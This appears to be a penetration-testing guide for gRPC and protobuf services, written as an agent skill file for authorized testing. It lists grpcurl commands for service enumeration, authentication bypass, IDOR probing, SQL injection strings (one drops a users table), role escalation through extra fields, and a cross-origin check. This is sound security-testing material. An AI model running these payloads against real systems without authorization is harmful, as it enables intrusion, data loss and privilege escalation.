# gRPC / Protobuf Security

> **Security Boundary Statement**
>
> This document is for **authorized penetration testing** of gRPC-based services only.
>
> - Payloads test input validation and access control on gRPC endpoints
> - Server reflection is used for service enumeration; **no unauthorized data access**
> - protobuf message fuzzing tests deserialization boundaries; **no mass data extraction**
> - See `SKILL.md` for execution boundaries

---

## Source: grpcurl docs, protobuf security research, PortSwigger gRPC lab

## Validation Objectives

| Validation Content | Default | Requires Authorization | Prohibited |
|---|---|---|---|
| Server reflection / service enumeration | ✓ | - | - |
| Method listing and message schema | ✓ | - | - |
| Input validation testing | ✓ Safe values | - | Mass data extraction |
| Auth header bypass | ✓ Test missing/invalid token | - | Use stolen credentials |
| Message field fuzzing | ✓ Type confusion | ✓ Overflow/edge values | DoS via resource exhaustion |

---

## 1. Service Discovery

### Server reflection

```bash
# List all services (requires reflection enabled)
grpcurl -plaintext {target}:{port} list

# List methods in a service
grpcurl -plaintext {target}:{port} list {service_name}

# Describe a message type
grpcurl -plaintext {target}:{port} describe {message_type}

# Describe a service with all methods
grpcurl -plaintext {target}:{port} describe {service_name}

# Full service exploration
grpcurl -plaintext {target}:{port} describe
```

### Without reflection

```bash
# If reflection is disabled, need .proto files
# Check for proto files in: repo, .git, JS bundles, API docs

# From .proto file:
grpcurl -plaintext -import-path ./protos -proto {file}.proto \
  {target}:{port} list

# From JS bundle (browser SPA):
# Look for grpc-web payloads in Network tab
# Extract service/method names from request paths
# Format: /{package}.{service}/{method}
```

### Common gRPC web paths

```
/grpc
/api/grpc
/{package}.{service}/{method}
/_proto/
```

---

## 2. Method Invocation

### Basic call

```bash
# Simple unary call
grpcurl -plaintext -d '{"name": "test"}' \
  {target}:{port} {package}.{service}/{method}

# With authentication
grpcurl -plaintext -H "Authorization: Bearer <token>" \
  -d '{"id": "1"}' \
  {target}:{port} {package}.{service}/GetUser

# Server streaming
grpcurl -plaintext -d '{"query": "*"}' \
  {target}:{port} {package}.{service}/Search

# Client streaming (from file)
grpcurl -plaintext -d @ {target}:{port} {package}.{service}/Upload \
  < requests.json
```

### Empty message

```bash
# Some methods take empty messages
grpcurl -plaintext -d '{}' {target}:{port} {package}.{service}/{method}
```

---

## 3. Security Testing

### Authentication bypass

```bash
# 1. No auth header
grpcurl -plaintext -d '{"id": "1"}' {target}:{port} {service}/{method}

# 2. Empty auth
grpcurl -plaintext -H "Authorization: " -d '{"id": "1"}' {target}:{port} {service}/{method}

# 3. Invalid token
grpcurl -plaintext -H "Authorization: Bearer invalid" -d '{"id": "1"}' {target}:{port} {service}/{method}

# 4. Metadata manipulation (gRPC uses metadata, not headers)
grpcurl -plaintext -H "x-request-id: admin" -d '{"id": "1"}' {target}:{port} {service}/{method}
```

### IDOR via message fields

```bash
# Test with different user IDs
for id in 1 2 3 admin root; do
  echo "Testing ID: $id"
  grpcurl -plaintext -H "Authorization: Bearer $TOKEN" \
    -d "{\"user_id\": \"$id\"}" \
    {target}:{port} {service}/GetUser
done
```

### Input validation

```bash
# SQL injection via protobuf string fields
grpcurl -plaintext -d '{"name": "' OR 1=1--"}' {target}:{port} {service}/{method}
grpcurl -plaintext -d '{"query": "'; DROP TABLE users;--"}' {target}:{port} {service}/{method}

# Type confusion — send wrong types
grpcurl -plaintext -d '{"id": "abc"}' {target}:{port} {service}/GetUser  # int field -> string
grpcurl -plaintext -d '{"id": 9999999999999999}' {target}:{port} {service}/GetUser  # overflow

# Nested message injection
grpcurl -plaintext -d '{"user": {"role": "admin"}}' {target}:{port} {service}/{method}

# Repeated field abuse
grpcurl -plaintext -d '{"ids": ["1","2","3","admin"]}' {target}:{port} {service}/BatchGet

# Unknown fields (should be ignored, but test)
grpcurl -plaintext -d '{"id": "1", "role": "admin", "is_admin": true}' {target}:{port} {service}/GetUser
```

### Error-based information disclosure

```bash
# Trigger errors to leak internal information
grpcurl -plaintext -d '{"id": "' long string '}' {target}:{port} {service}/{method}
grpcurl -plaintext -d '{}' {target}:{port} unknown.service/method

# Check error messages for:
# - Stack traces
# - Internal hostnames
# - Database connection strings
# - File paths
```

---

## 4. protobuf-specific Attacks

### Field shadow / extra fields

```python
# Many JSON -> protobuf decoders accept extra fields
# Test if adding unknown fields causes unintended behavior

# Role escalation via extra field
grpcurl -plaintext -d '{"username": "user1", "password": "x", "role": "admin"}' \
  {target}:{port} auth.AuthService/Register

# Internal field override
grpcurl -plaintext -d '{"name": "test", "is_verified": true, "email_verified_at": "2026-01-01"}' \
  {target}:{port} user.UserService/Create
```

### Enum manipulation

```bash
# Protobuf enums are integers — try values outside defined range
grpcurl -plaintext -d '{"status": 99}' {target}:{port} {service}/{method}
grpcurl -plaintext -d '{"role": -1}' {target}:{port} {service}/{method}
```

### OneOf confusion

```bash
# If message uses oneof, try sending multiple
grpcurl -plaintext -d '{"email": "a@b.com", "phone": "123456"}' \
  {target}:{port} {service}/{method}
# Should only accept one — test if server handles conflict safely
```

---

## 5. grpc-web (Browser-based)

### Intercept grpc-web traffic

```bash
# grpc-web uses Content-Type: application/grpc-web+proto
# or application/grpc-web-text+proto (base64)

# Look in browser Network tab for requests to:
# /{package}.{service}/{method}
# with content-type: application/grpc-web+proto

# Decode grpc-web response:
# Frame format: [1 byte compressed flag][4 byte length][protobuf data]
# Use grpcurl or custom decoder
```

### grpc-web specific tests

```
# CORS check — can third-party origin call the endpoint?
Origin: https://evil.com
# If no CORS validation -> grpc-web bypass

# Missing auth on grpc-web endpoints
# Some services enforce auth on gRPC but not grpc-web
```

---

## Tools

| Tool | Install | Use |
|---|---|---|
| grpcurl | `go install github.com/fullstorydev/grpcurl@latest` | Service discovery, method calls |
| grpcui | `go install github.com/fullstorydev/grpcui@latest` | Web UI for gRPC services |
| ghz | `go install github.com/bojand/ghz@latest` | gRPC benchmarking/fuzzing |
| evans | `go install github.com/ktr0731/evans@latest` | Interactive gRPC client |
| protoc | OS package manager | Compile .proto files |
| buf | `go install github.com/bufbuild/buf@latest` | Modern protobuf toolchain |

---

## Severity Classification

gRPC/protobuf testing defaults to low severity — endpoint discovery/reflection enumeration does not equal impact. Only when **authentication bypass confirmed** or **unauthenticated methods return sensitive data** is High required.

| Actual case | Severity | Note |
|---------|------|------|
| gRPC method authentication bypass confirmed (no token/forged token/metadata tampering causes a privileged call to succeed) | High | authentication boundary break confirmed |
| unauthenticated method is callable and returns sensitive data (user data/internal information/credentials) | High | data leakconfirmed |
| protobuf reflection can enumerate services/message structures (discloses internal API design) | Medium | information disclosure, attack surface exposure |
| only discovery of gRPC endpoint (no exploitable method/reflection disabled/no data returned) | Low | attack-surface discovery only |

**Key judgment**:High core criterion is"authentication boundary was actually broken". methods are listed but calls are denied / reflection enumerates structure but no data is readable - record only as Medium/Low. 

---

## Detection Checklist

| Item | Check | Pass Criteria |
|---|---|---|
| Reflection enabled | `grpcurl list` | Reflection disabled in production |
| Service enumeration | List all services | Only authorized services visible |
| Auth enforcement | Call method without token | Unauthenticated calls rejected |
| IDOR | Access other user's data | Cross-user access denied |
| Input validation | SQLi / overflow / type confusion | Invalid input rejected or sanitized |
| Error messages | Trigger errors | No internal info in error responses |
| CORS | Cross-origin grpc-web call | Third-party origins blocked |
| Extra fields | Add unknown fields to message | Extra fields ignored, no side effects |
